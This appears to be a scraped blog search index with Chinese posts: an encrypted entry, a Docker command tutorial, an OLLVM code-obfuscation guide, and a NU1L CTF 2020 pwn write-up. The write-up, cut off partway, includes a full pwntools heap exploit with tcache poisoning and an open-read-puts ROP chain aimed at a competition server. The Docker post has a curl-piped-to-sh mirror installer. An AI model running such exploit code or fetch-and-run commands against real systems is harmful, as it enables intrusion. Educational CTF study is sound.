6c34fef43fd45a140f971228eb4b37281d1bce0c0acb00feecd0332f7e2053dd0d20e85c78d0a8a7ecb41e41db9bf6307e628ef855d14ab5f998305c7d4ab892e61fd32eef742f1b3ae4870df82b8c567d146cdd606e461fbe7e7acf1f41b3e91b6e96af8ff3d499fa235ed643938fca33051c8fb7f9470ed054968b3b07e3de2c8cc6bf3348fc4848aa7e0076c81fb4e6db8baced74ed3ce7cf9804ded0c6f5dd13b56004b150e5aff764d945cecdc4ff4726d39850d3897ef6074e529b931a03766d8ce0e85c011c93ca79cc4c47b03f4b6cde502d002a498501805794043e4b941f2ef045474fc2e3c86627891c3ed1e5fc1d647b59052deb4c7d179224b8cf594ab4265489c3b7a2f4a9784e2465f92872de3c2b87498026a692f99df0f1acc8037f87e0cd6db7cd51a7bed851f7e2d6df20f0135bd3c2d057e776e26cb4c0f75577ba748cec21e04178cee67272158281ba02443ed3346e9b52d2c4131334c979558ce1932f4f384201623725e1de43ebe3930c82af5162fe76b509caf50069121c5af5069c65698cf2163943e03b387b19aacfd8bbeac3b2a880c5586c4c2c403c7a9bc0facba64369055202e4ec08f531aa4a3e1559a176da415a3c6707c4b5f08a35eb545419200160a121a055819faa88b3aec98a438ef36ce5967044f2a03b0ea258af733634d1cb5e7a7fe0f7a3338f85b7f329261ac3ccfb1eb5767454f02ea8551fa0049decfc05246160a4e78cb7af0dceb667b9277bd52a73634e13af0d4961d886a0cc119b0fef9a8b7c82473e0f24e629ae7a25e01ee85bbd3c52b13fa7ea3fc1147277d99eb6c888f2d3c55b8274db122c6897e34a0720e18951b08782c2a0e2420c1ebb258560e01dfd47dcd9bbf4a0f9d16278318a91a3d207bf80e45a25210cede8d4a7fb8c044b2219af4c1a5b22544b2a073800a2b5bd6c9d5d9ca2ebe79f74f70995dd9c9a67a373a59bea7a5f44b6b69a407ec06a2e04835a947e886d76eb31cd799573cdc55c161e730aa7eb7ee1e3c36d209b54d157a7134500056f88621a2efd71b40525561e4737f8a7cd444ded424b15df32924d81abf737a1e096f5eb756a537b7854c82f93ec2916728519b2896613ba382d2856c7f06137a7403df8c75b7b8fee8714cbbae2c6b922edc11cf6af4b879d1d8270306d101ef16259998233d61d3076c9eba523be768002a930b207925cf852a1504d21d90c0ac7fc0d6e138acab6c25c3e7217b4b95cae2b7342367425e724e2e2a05c5e919a8d2bfa881630de55edccede89eb7278134cdbeb407b69897d387634dc634c1abd3baaffd5d37194084bf94f78ad8d8ebc30fe85c59af9430d494a860fdde424bc70c92529a3a5cbe5ccbeea831995beea0cdaf7bd825c08b8efdf8a18bafd1880e47cf8ff8ca52879a42287a3fa77461c8e4f48209c5670bbe6b38f33dd6621abaa40f0504bc4755b591ce90f20a88c3903f4d9030939e39750406bfd201b8415d52e4cda5e889ee116ab5cece9dac8eb33a0c4a7f36e196b77e3f7b6ee64ec0075622ce4cf1fc87fabe6058b5ce53e62d0eb4281d2fa573be2c376bd13582132301a57659e8b9ea7f911c53ace5795a9f63fd38ad29819b0c1decbf89ed5e5928bdf60ef885915cb7d9fa305db9d963d59aa4cd44c95080ec87803a7d9bb2c15ce8c29b7d8b408d2958d934a9f2343b7cb4b1cb890d691ae604756b9504c69f50cfab05bf52037aebef775e9566a844446b9ebb4d62e8e6572d25ef877c2dec8fff1ff4195631a09f2b38bea82038d42267b6c72df31e7fbac66977dd5026f8ae9fc70fc720360b5b4e70bfa15eba9c3a2a9596a9a1c1f19470af5915cfaf864edec7ebc998ab065874a82935a5a725bf374cdfbb8d5d8845c1ccd3d5ebeabbac7925a9b5cdda67e35a59fe25d1b435598b823f2db0bd8128747d686fadcdc9fcab81664c5c9e4798ced44b66025900c00d6d6e88faa881b529cbe20058e53341e388d859eb5140b37d949b633e936815ce0233920f2b6057081f385606ce56232d7cb13f455b4f80f509adf3fc862f9411e5f34e8e7c8d0636189eea047a1c51802e6b855b3a0c016b9ae86abbce903ae7f5f499f19180cdaef29aba7b99e06080fc637ec897fd7d5ed48553260215c012218dc613e742b74f44847940fd6538759af1cf5a0c379e9a15057fd7e034f30134989c0f3e8bd5140d5be70d10614b9dcb488eeddfef77e38a0f81d25b1af2841ab3fffe6e290f78b33c441d02b834744f657a8cafa73b05e9fa8691c6cde7ef8ebeb488170d1165b683f7eca6470520c517c3ff46e031fbd34f511f2bb1c773447f880d52e07af2f2f6159c626da79a7e0a7a4ce106e677ee4bc7de4301393c31396e7023785113066a699c68fc10068161f2c7f0b38eb518f1fe58d378ea7f0ade4b685d2d36126d51208eb3363dee416f76b5764718420b25896eb2f92ff8eb687b7945dad7f416b156b69b1f9d5716949962ca2228485f67ce60835a0bc18005a03ccb051176e36ed465ebf7da72b3e096ab184a17f393a0906e4d75f9091f65e85ff2b457c05426df53eb5c620213ae8082d6ef620b6302c907b349954e93aecfd4278a6bd598a399e642dbf2152a1aee6dedf454be8ac51fef4b01ac1970da4f06cedfff17feda6217f30ca0c1ce5e0050eecfc0b22ba2bfa629cece15e447292e71a1e4932c2b822fe259fc62c4b0a7144a1bd498ca8592245331e65c7018df64c7f82dc50f79dee350cfad4a01a9170bece030bedfee2276f1a1e5b07b8ca5914ca4d041226c12426c0c75e880375935b0379d7f5fb57fc5a919e304dc103d496a841e1e2866386505d592958174ddd33e3c7c79ccfd559d520099f10b6270ad50701bf57990f3329e3a207f3e436b8283b988f456aa2a65d4a3aa46ac8156535446478baf45a8d5729f4d2212b3e9a776236f481a20c1b06616a12ed8cb47c3d6a6bd5b4b377084b96b890d58a90dd288c748da3c381d50d2366ff7ea50934547c5b4c879c1dd249e784903e001e4946f5d64d763c56d88bc6f3755dfad6ddd173d0c9105f77f27c57f5144a2046941f018b22b901ef724f0e9bf53b54fe145d79c2155f50b55d6913a49d443e9f0a7c962d4a4779b0e64df9ab73909ea030f7bb94835779a9cabccf36e374958e871dc2666d810c7dfb7f5a550353c053545df3d395f9ecf465bfdf50f4de27dfec57155f19329e74b19171e626bb4c5b62142c9a0db4808564a33b76b041b74be9e78dcc4a29d0957c4aef907a1ba49ef5efe3c5e5bbefe1aa1b80bd55fcc49f364658c8b262eb1431f8c50ae4fd1564bf91ae8fa05be1692461355dbabe22f0d57cad2b782966337ff4487af0423b2046df61b73771e93f0e5cf152bdacf58b5e05b005fe2ef355339a60a3bf67004847386db1957cddbef0c964acad8b64f2ced24f35c610378bd454a2ebae6ba2411883cc9b384ddb0d22b75f8ae7c94c78dcfd5386d5927cd8c09a1a1f2e797928016bc37d08ccddf515af222a44d226ec0855b8cd34ee3518ce78c72698aca337f2f49e8c60054f85cb57cb230f6da05366a4aa72e3b7e3d2f243785e2cffee030cb09696a39a19d1b2b64d3898bd05c5377e5c3107d084ab7f9db04351a7b7c0ae0cab7eb123a489be5651244231be6c68725e4841d4d10b6230e0033fb54b644010b4f87a92250c309d386d3ead801a44cf4cfe77667e90a16da3e7f927bffccfe99cf5758200ac8e79b82cad61b3dfeb597c3f08e3d729277709f65f3c861f2679822187769ae0e95ef12ea432fc689997e038929850f18f82c75e7385cba76778bf8c941bef7922df68881a0abd9ea78a9e2e9e733ff22737c005bfd2bbfa9b9ba271faf7086372f58bc4715972798c2e2b3eb0b8b20b5b75af1d302a69bb4d1f7782c118ea747412c634f5ee277c13b820ada6e1ec9956127366bde442a29c1fb7\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"Docker基本命令","url":"/2020/10/25/env/docker/docker_basic_cmd/","content":"Docker基本命令关闭 SELINUX 服务SELINUX是CentOS系统捆绑的安全服务程序, 因为安全策略过于严格, 所以建议关闭这个服务修改 &#x2F;etc&#x2F;selinux&#x2F;config文件, 设置SELINUX&#x3D;disabled安装:Centos: \nyum install docker -y //-y代表默认安装service docker startservice docker stopservice docker restart\n\n\n\nDebain:\nsudo apt install dockersudo apt install docker-compose\n\n\n\nCockerHub: 是Docker公共镜像库, 为用户提供了大量的镜像文件https://hub.docker.com/由于国内网络访问DockerHub很慢, 无法下载镜像文件,我们可以使用Docker加速器\n网易镜像中心：https://c.163.com/hub#/m/home/docker pull hub.c.163.com&#x2F;library&#x2F;tomcat:latest\ndocker 中科大源: https://lug.ustc.edu.cn/wiki/mirrors/help/docker\n安装加速器:curl -sSl https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io&#x2F;&#x2F;启动加速器.&#x2F;acc.sh {“registry-mirrors”: [“http://f1361db2.m.daocloud.io&quot;]}\n修改Docker配置文件,去掉逗号vim &#x2F;etc&#x2F;docker&#x2F;daemon.json{“registry-mirrors”: [“http://f1361db2.m.daocloud.io&quot;]}\n安装python镜像:docker pull python:3.8\n查看镜像:docker images\n查看镜像的详细信息:docker inspect python:3.8\n将镜像导出docker save python:3.8 &gt; &#x2F;root&#x2F;python.tar\n删除镜像docker rmi python:3.8\n导入镜像docker load &lt; &#x2F;root&#x2F;python.tar\n创建docker容器:it代表创建一个容器, 后面需要交互, bash交互docker run -it –name&#x3D;p1 python:3.8 bash\n查看容器docker ps -a\n启动容器容器名为p1docker start p1\n暂停容器:docker pause p1\n取消暂停容器:docker unpause p1\n使用bash进入p1容器docker exec -it p1 bash\n查看容器详细信息docker inspect p1\n停止容器docker stop p1\n删除容器必须先停止容器docker rm p1\nDocker 网络是Docket内的内部网络\n默认情况下, Docker环境会给容器分配动态的IP地址,这就导致下次启动容器的时候,IP地址就变了可以单独创建Docker内部的网段(172.18.0.x)172.18.0.0&#x2F;16 表示网络码占16位，也就是说该网络上可以有65534个主机(2^16-2)IP范 围：172.18.0.1~172.18.255.254 172.18.255.255是广播地址，不能被主机使用.设置IP地址的时候：172.18.x.y 子网掩码：255.255.0.0mynet 是自定义名字\ndocker network create –subnet&#x3D;172.18.0.0&#x2F;16 docker_net\n解除容器绑定的网络 网络名词docker_net 容器名称 testsudo docker network disconnect docker_net test\n\n删除原先的网络sudo docker network rm docker_net\n\n创建新的网络sudo docker network create --subnet=192.168.222.0/24 mynetwork\n\n连接新的网络sudo docker network connect mynetwork test \n\n重新启动容器sudo docker container restart test\n\n注意:删除某个网段, 删除网段之前, 必须先删除容器\ndocker network rm mynet\n\n创建容器并指定ip, 而 172.18.0.1是网关地址, 是不能使用的docker run -it –net mynet –ip 172.18.0.2 python:3.8 bash\n查看网段docker network ls\n删除mynet网段docker network rm mynet\n指定某个ip创建容器docker run -it –name&#x3D;p1 –net mynet –ip 172.18.0.2 python:3.8 bash\n容器端口映射默认情况下, 除了宿主机之外,任何主机无法访问远程Docker容器通过端口映射,可以吧容器端口映射到宿主机的端口,这样其他主机就能访问了映射到宿主机的端口,不需要设置防火墙规则,便可以使用将容器的5000端口映射到宿主机的9500端口docker run -it -p 9500:5000 python:3.8 bash\n映射多个端口docker run -it -p 9500:5000 -p 9600:3306 python:3.8 bash\n目录挂载在技术为了能把一部分业务数据保存在Docker环境之外,或者把宿主机的文件传入容器,所以需要给容器挂载宿主机的目录Docker环境只支持目录挂载,不支持文件挂载, 且一个容器可以挂载多个目录\n将宿主机的&#x2F;root&#x2F;test目录挂载到容器的&#x2F;root&#x2F;project 目录中docker run -it -v &#x2F;root&#x2F;test:&#x2F;root&#x2F;project –name&#x3D;p1 python:3.8 bash\n给docker添加用户组sudo groupadd docker    #添加docker用户组sudo gpasswd -a $USER docker #将登陆用户加入到docker用户组中newgrp docker #更新用户组docker ps     #测试docker命令是否可以使用sudo正常使用\n\n\n\n","categories":["env"],"tags":["docker"]},{"title":"反逆向分析","url":"/2020/10/20/security/reverse/against_reverse/","content":"反逆向分析Ollvm0x01 Ollvm介绍OLLVM（Obfuscator-LLVM）是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个项目，该项目旨在提供一套开源的针对LLVM的代码混淆工具，以增加逆向工程的难度, 只不过Ollvm仅更新到llvm的4.0，2017年开始就没再更新。\n0x02 Ollvm混淆介绍Ollvm混淆主要分成三种模式，这三种模式主要是流程平坦化，指令替换，以及控制流伪造。\n流程平坦化 ：这个模式主要通过将if-else语句替换成do-while语句，然后通过switch语句来对流程的控制，这样就能模糊基本块之间的前后关系。\n指令替换 ：这个模式主要通过使用更复杂的指令序列来替换一些标准的二元运算符，从而增加逆向的难度。\n控制流伪造 ：这个模式主要是会在一个简单的运算中外包好几层if-else的判断，从而增加逆向的难度。\n\n对Ollvm有更深入的理解，可参阅论文《Obfuscating C++ programs via control flow flattening》\n\n0x03 Ollvm编译env: arch-linux\n使用apt源安装g++和cmake，从github获取ollvm的源码，并进行编译。\nOllvm 6.0: https://github.com/yazhiwang/ollvm-tll.git (编译成功!)\n原版src: https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0  (编译失败!)\nollvm-til编译mkdir buildcd buildcmake -DCMAKE_BUILD_TYPE=Release ../ollvm-tll-mastermake -j8\n\n\n\n官方编译cd mkdir buildcmake  -DCMAKE_BUILD_TYPE=Release  -DLLVM_INCLUDE_TESTS=OFF  ../make -j8\n\n0x4 命令介绍控制流扁平化这个模式主要是把一些if-else语句，嵌套成do-while语句\n -mllvm -fla：激活控制流扁平化\n -mllvm -split：激活基本块分割。在一起使用时改善展平。\n -mllvm -split_num&#x3D;3：如果激活了传递，则在每个基本块上应用3次。默认值：1\n指令替换这个模式主要用功能上等效但更复杂的指令序列替换标准二元运算符(+ , – , &amp; , | 和 ^)\n -mllvm -sub：激活指令替换\n -mllvm -sub_loop&#x3D;3：如果激活了传递，则在函数上应用3次。默认值：1\n虚假控制流程这个模式主要嵌套几层判断逻辑，一个简单的运算都会在外面包几层if-else，所以这个模式加上编译速度会慢很多因为要做几层假的逻辑包裹真正有用的代码。\n -mllvm -bcf：激活虚假控制流程 -mllvm -bcf_loop&#x3D;3：如果激活了传递，则在函数上应用3次。默认值：1 -mllvm -bcf_prob&#x3D;40：如果激活了传递，基本块将以40％的概率进行模糊处理。默认值：30\n其他 -mllvm -sobf 开启字符串混淆\n -mllvm -seed&#x3D;0xdeadbeaf 指定随机数种子生成器 bcf可以配合下面参数使用\n例子对a.c进行混淆\n#include&lt;stdio.h&gt;void exec() &#123;\tprintf(&quot;OOOKKKK!&quot;);&#125;int main(void) &#123;    int a = 0;    a ++;\tprintf(&quot;Hello World&quot;);    if(a &gt;= 1) &#123;        exec();    &#125;\treturn 0;&#125;\n\n\n\n~/tools/ollvm/bin/clang a.c -mllvm -fla  -mllvm -sobf  -mllvm -bcf  -o a\n\nida64打开F5\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  signed int v3; // eax  __int64 *v4; // rcx  int v5; // eax  signed int v6; // edx  signed int v7; // eax  signed int v8; // eax  signed int v9; // eax  __int64 *v11; // rcx  int v12; // eax  __int64 v13; // [rsp+0h] [rbp-50h]  int v14; // [rsp+8h] [rbp-48h]  int v15; // [rsp+Ch] [rbp-44h]  __int64 *v16; // [rsp+10h] [rbp-40h]  int v17; // [rsp+18h] [rbp-38h]  int v18; // [rsp+1Ch] [rbp-34h]  int v19; // [rsp+20h] [rbp-30h]  int v20; // [rsp+24h] [rbp-2Ch]  int v21; // [rsp+28h] [rbp-28h]  int v22; // [rsp+2Ch] [rbp-24h]  int v23; // [rsp+30h] [rbp-20h]  int v24; // [rsp+34h] [rbp-1Ch]  int v25; // [rsp+38h] [rbp-18h]  int v26; // [rsp+3Ch] [rbp-14h]  int v27; // [rsp+40h] [rbp-10h]  bool v28; // [rsp+45h] [rbp-Bh]  bool v29; // [rsp+46h] [rbp-Ah]  bool v30; // [rsp+47h] [rbp-9h]  v28 = (((_BYTE)x_2 - 1) * (_BYTE)x_2 &amp; 1) == 0;  v29 = y_3 &lt; 10;  v27 = 1567572003;  while ( 1 )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        v26 = v27;        v25 = v27 + 1130483098;        if ( v27 != -1130483098 )          break;        v9 = -1065940243;        if ( y_3 &lt; 10 || (((_BYTE)x_2 - 1) * (_BYTE)x_2 &amp; 1) == 0 )          v9 = -714366873;        v27 = v9;      &#125;      v24 = v26 + 1065940243;      if ( v26 != -1065940243 )        break;      v27 = -1130483098;    &#125;    v23 = v26 + 714366873;    if ( v26 == -714366873 )      break;    v22 = v26 + 511865542;    if ( v26 == -511865542 )    &#123;      v8 = -1065940243;      if ( y_3 &lt; 10 || (((_BYTE)x_2 - 1) * (_BYTE)x_2 &amp; 1) == 0 )        v8 = -1130483098;      v27 = v8;    &#125;    else    &#123;      v21 = v26 + 329192939;      if ( v26 == -329192939 )      &#123;        v11 = &amp;v13 - 2;        *((_DWORD *)&amp;v13 - 4) = 0;        *(_DWORD *)v11 = 0;        *(_DWORD *)v11 = *((_DWORD *)&amp;v13 - 4) + 1;        v12 = printf(&amp;byte_404030);        v27 = 191033970;        v14 = v12;      &#125;      else      &#123;        v20 = v26 - 191033970;        if ( v26 == 191033970 )        &#123;          v4 = &amp;v13 - 2;          *((_DWORD *)&amp;v13 - 4) = 0;          *(_DWORD *)v4 = 0;          *(_DWORD *)v4 = *((_DWORD *)&amp;v13 - 4) + 1;          v16 = &amp;v13 - 2;          v5 = printf(&amp;byte_404030);          v6 = -329192939;          v30 = *(_DWORD *)v16 &gt;= 1;          if ( y_3 &lt; 10 || (((_BYTE)x_2 - 1) * (_BYTE)x_2 &amp; 1) == 0 )            v6 = 1347608926;          v27 = v6;          v15 = v5;        &#125;        else        &#123;          v19 = v26 - 1347608926;          if ( v26 == 1347608926 )          &#123;            v7 = -511865542;            if ( v30 )              v7 = 1700479422;            v27 = v7;          &#125;          else          &#123;            v18 = v26 - 1567572003;            if ( v26 == 1567572003 )            &#123;              v3 = -329192939;              if ( v29 || v28 )                v3 = 191033970;              v27 = v3;            &#125;            else            &#123;              v17 = v26 - 1700479422;              if ( v26 == 1700479422 )              &#123;                exec();                v27 = -511865542;              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;  &#125;  return 0;&#125;\n\n以上成功实现代码混淆\n参考Obfuscating C++ programs via control flow flattening \n去除符号表查看符号表\n  readelf -s test\n采用strip工具对符号表进行去除\n.symtab因为是在调试和链接时有用的，所以，可以从生产的二进制执行文件中移除。可以使用strip。strip是可以移除符号以及节的工具。\n\n移除.symtab 符号表 以及 .strtab 符号字符串表直接运行\n\nstrip --remove-section=.symtab file_in\nstrip --remove-section=.strtab file_in\n\n\n想要让可执行文件没有.dynsym动态链接表，.dynstr动态链接字符表。gcc编译时添加参数，从而使用静态编译。gcc -static 或者 gcc -nostdlib\n\ngcc -nostdlib ：不连接系统标准启动文件和标准库文件，只把指定的文件传递给连接器。\ngcc -static：在支持动态链接的系统上，阻止连接共享库。该选项在其它系统上 无效。\n\n\n\n","categories":["security"],"tags":["reverse"]},{"title":"2020 nu1lctf Pwn WP","url":"/2020/10/18/security/ctf/compitation/wp-nu1lctf-2020/","content":"NU1L 2020 WPPWNsignin经典的菜单体, 与ddctf的一个pwn非常类似, 打远程超级慢, 打一个小时左右….\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int v3; // [rsp+4h] [rbp-Ch]  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  while ( 1 )  &#123;    show_menu();    std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v3);    switch ( v3 )    &#123;      case 2:        del();        break;      case 3:        show();        break;      case 1:        add();        break;    &#125;  &#125;&#125;\n\n\n\nunsigned __int64 add()&#123;  int v1; // [rsp+Ch] [rbp-14h]  char n; // [rsp+10h] [rbp-10h]  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Index:&quot;);  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v1);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Number:&quot;);  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;n);  if ( v1 == 1 )    sub_12E8((__int64)&amp;p_1, (__int64)&amp;n);  if ( v1 == 2 )    sub_12E8((__int64)&amp;p_2, (__int64)&amp;n);  return __readfsqword(0x28u) ^ v3;&#125;\n\nvulunsigned __int64 del()&#123;  int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Index:&quot;);  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v1);  if ( v1 == 1 )    sub_1364((__int64)&amp;p_1);  if ( v1 == 2 )    sub_1364((__int64)&amp;p_2);  return __readfsqword(0x28u) ^ v2;&#125;void __fastcall sub_1364(__int64 a1)&#123;  *(_QWORD *)(a1 + 8) -= 8LL;  sub_17A6(a1, *(_QWORD *)(a1 + 8));&#125;\n\n在进行删除的时候没有进行越界检查, 只是单纯的调整数据指针, 造成溢出漏洞。打印函数, 没有检查该数据是否在开辟内存范围内, 造成uaf漏洞, 可以打印数据指针指向的数据.\n思路这个题比较坑, 首先我是劫持了malloc_hook打one_gadget, 全部试了, 都无法打, 然后我劫持free_hook为system, 传入’&#x2F;bin&#x2F;sh’也没法get shell, 在程序里也没有发现沙箱, └&gt; seccomp-tools也没检查出来, 不知道是采用啥来避免get shell, 只能采用orw来打了, 打入stack, 但是再泄漏stack的时候, 是需要打入envrion的 ,再free的时候需要对大小进行处理, 这里我也卡了好久, 修改chunk size为所开辟的大小就不会错误退出。后面就是劫持add 函数的ret地址来rop, 还有要控制好啥时候就开始rop, rop链太长, 出现中断, 这就没法打了, 开辟内存 &gt; 0x80的时候就开辟内存至stack中, 然后触发rop\n泄漏libcli(&#x27;exploit...&#x27;)for i in range(258):\tli(&#x27;ad: &#x27; + str(i))\tad(1, i)for i in range(258):\tli(&#x27;rm: &#x27; + str(i))\trm(1)for i in range(int((0xef0 - 0x6e0) / 8) - 1):\tli(&#x27;rm: &#x27; + str(i))\trm(1)dp(1)leak = int(ru(&#x27;\\n&#x27;))libc_base = 0li(&#x27;leak: &#x27; + hex(leak))libc_base = leak -  0x3ebc40 - 96#libc_base = leak -  0x3afc40 - 96li(&#x27;libc_base: &#x27; + hex(libc_base))\n\n\n\n泄漏heapt = 0x20 + 0x30 + 0x50 + 0x90 + 0x110 + 0x210 + 0x410for i in range(int(t / 8)):\tli(&#x27;rm: &#x27; + str(i))\trm(1)#rm(1)dp(1)leak = int(ru(&#x27;\\n&#x27;))li(&#x27;leak: &#x27; + hex(leak))heap_base = leak - (0x55a7e41cee70 - 0x55a7e41bd000)li(&#x27;heap_base: &#x27; + hex(heap_base))t = 72721 + 593\n\n\n\n修改tcache struct修改该结构， 程序中存在第二个vector, 那么我们就可以采用第二个vector开辟内存时实现任意地址读写\nfor i in range(int(t / 8) - 4):\tli(&#x27;rm: &#x27; + str(i))\trm(1)environ = libc_base + libc.sym[&#x27;environ&#x27;]li(&#x27;environ: &#x27; + hex(environ))ad(1, environ + 8)\n\n\n\n泄漏stackenviron = libc_base + libc.sym[&#x27;environ&#x27;]li(&#x27;environ: &#x27; + hex(environ))ad(1, environ + 8)ad(2, 0)ad(2, 0)ad(2, 0)rm(2)rm(2)rm(2)dp(2)stack = int(ru(&#x27;\\n&#x27;))li(&#x27;stack: &#x27; + hex(stack))stack_ret = stack - (0x7ffc90831238 - 0x7ffc90831128)li(&#x27;stack ret: &#x27; + hex(stack_ret))\n\n\n\n修复 chunk size# passby free size check# recovery as normalrm(2)rm(2)ad(2, 0x31)ad(2, 0x31)\n\n\n\n修改tcache struct修改 0x91位置指向add 函数的return地址, 避免破坏原来的tcahce bin 地址, 也让flag字符串存在里面\n# modify tcache struct ad(1, 0)# 0x41p_a = heap_base + (0x556b504f0ee0 -  0x556b504df000)li(&#x27;heap_0x41: &#x27; + hex(p_a))ad(1, p_a)for i in range(3):\tad(1, 0)p_a =  heap_base + (0x55f0423c1f30 -  0x55f0423b0000)li(&#x27;heap_0x71: &#x27; + hex(p_a))ad(1, p_a)for i in range(6):\tad(1, 0)flag = &#x27;./flag\\x00&#x27;flag = flag.ljust(8, &#x27;\\x00&#x27;)flag_addr  = heap_base + 0xc0ad(1, u64(flag)) # heap_base  + 0xc0ad(1, stack_ret)\n\n\n\n构造rop打入add函数return 地址rop长度需要小于0x80, 然后使长度大于0x80的时候, 就会打入stack利用rop\n\tlibc_read = libc_base + libc.sym[&#x27;read&#x27;]\tlibc_open = libc_base + libc.sym[&#x27;open&#x27;]\tlibc_puts = libc_base + libc.sym[&#x27;puts&#x27;]\tpop_rdi = libc_base + 0x2155f\tpop_rsi = libc_base + 0x23e8a\tpop_rdx = libc_base + 0x1b96\tpop_rdx_rsi = libc_base + 0x130889#\t# ret to here#\t# open\tad(2, pop_rdi)\tad(2, flag_addr)\tad(2, pop_rdx_rsi)\tad(2, 0)\tad(2, 0)\tad(2, libc_open)\t# read\tad(2, pop_rdi)\tad(2, 3)\tad(2, pop_rsi)\tad(2, flag_addr + 0x100)\tad(2, pop_rdx)\tad(2, 0x100)\tad(2, libc_read)\t# puts\tad(2, pop_rdi)\tad(2, flag_addr + 0x100)\tad(2, libc_puts)\t#db()\t# trigger\tad(2, 0)\n\n\n\n\n\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)#context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;signin&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;47.242.161.199&quot;server_port = 9990# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(i, n):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, str(i))\tsla(&#x27;:&#x27;, str(n))def rm(i):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, str(i))def dp(i):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)\tsla(&#x27;:&#x27;, str(i))#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tfor i in range(258):\t\tli(&#x27;ad: &#x27; + str(i))\t\tad(1, i)\tfor i in range(258):\t\tli(&#x27;rm: &#x27; + str(i))\t\trm(1)\tfor i in range(int((0xef0 - 0x6e0) / 8) - 1):\t\tli(&#x27;rm: &#x27; + str(i))\t\trm(1)\tdp(1)\tleak = int(ru(&#x27;\\n&#x27;))\tlibc_base = 0\tli(&#x27;leak: &#x27; + hex(leak))\tlibc_base = leak -  0x3ebc40 - 96\t#libc_base = leak -  0x3afc40 - 96\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tt = 0x20 + 0x30 + 0x50 + 0x90 + 0x110 + 0x210 + 0x410\tfor i in range(int(t / 8)):\t\tli(&#x27;rm: &#x27; + str(i))\t\trm(1)\t#rm(1)\tdp(1)\tleak = int(ru(&#x27;\\n&#x27;))\tli(&#x27;leak: &#x27; + hex(leak))\theap_base = leak - (0x55a7e41cee70 - 0x55a7e41bd000)\tli(&#x27;heap_base: &#x27; + hex(heap_base))\tt = 72721 + 593\tfor i in range(int(t / 8) - 4):\t\tli(&#x27;rm: &#x27; + str(i))\t\trm(1)\tenviron = libc_base + libc.sym[&#x27;environ&#x27;]\t\tli(&#x27;environ: &#x27; + hex(environ))\tad(1, environ + 8)\tad(2, 0)\tad(2, 0)\tad(2, 0)\trm(2)\trm(2)\trm(2)\tdp(2)\tstack = int(ru(&#x27;\\n&#x27;))\tli(&#x27;stack: &#x27; + hex(stack))\tstack_ret = stack - (0x7ffc90831238 - 0x7ffc90831128)\t\tli(&#x27;stack ret: &#x27; + hex(stack_ret))\t# passby free size check\t# recovery as normal\trm(2)\trm(2)\tad(2, 0x31)\tad(2, 0x31)\t# modify tcache struct \tad(1, 0)\t# 0x41\tp_a = heap_base + (0x556b504f0ee0 -  0x556b504df000)\tli(&#x27;heap_0x41: &#x27; + hex(p_a))\tad(1, p_a)\tfor i in range(3):\t\tad(1, 0)\t\tp_a =  heap_base + (0x55f0423c1f30 -  0x55f0423b0000)\tli(&#x27;heap_0x71: &#x27; + hex(p_a))\tad(1, p_a)\tfor i in range(6):\t\tad(1, 0)\tflag = &#x27;./flag\\x00&#x27;\tflag = flag.ljust(8, 